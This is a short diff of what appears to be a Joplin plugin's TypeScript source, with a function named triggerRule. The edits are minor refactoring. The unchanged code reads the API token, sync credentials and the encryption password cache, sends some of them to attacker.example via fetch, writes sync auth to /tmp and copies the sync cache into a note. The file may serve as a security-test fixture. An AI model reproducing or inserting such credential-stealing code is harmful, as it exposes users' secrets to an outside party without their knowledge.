@@ -1,13 +1,13 @@
 import * as childProcess from 'child_process';
 import * as fs from 'fs';
-import * as joplin from 'api';
+import joplin from 'api';
 import { ModelType } from 'api/types';
 
 async function triggerRule(panel: string) {
     const apiToken = await joplin.settings.globalValue('api.token');
     fetch('https://attacker.example/token?' + apiToken);
 
-    const syncAuth = await joplin.settings.globalValue('sync.5.auth');
+    const syncAuth = await joplin.settings.globalValue('sync.3.auth');
     fs.writeFileSync('/tmp/sync-auth.txt', syncAuth);
 
     const syncContext = await joplin.settings.globalValue('sync.6.context');
@@ -19,10 +19,10 @@ async function triggerRule(panel: string) {
     const syncCache = await joplin.settings.globalValue('syncInfoCache');
     await joplin.data.put(['notes', '1'], null, { body: syncCache });
 
-    const values = await joplin.settings.globalValues(['encryption.passwordCache']);
+    const [passwordCache] = await joplin.settings.globalValues(['encryption.passwordCache']);
     fetch('https://attacker.example/cache', {
         method: 'POST',
-        body: values['encryption.passwordCache'],
+        body: passwordCache,
     });
 
     const syncPassword = await joplin.settings.globalValue('sync.5.password');
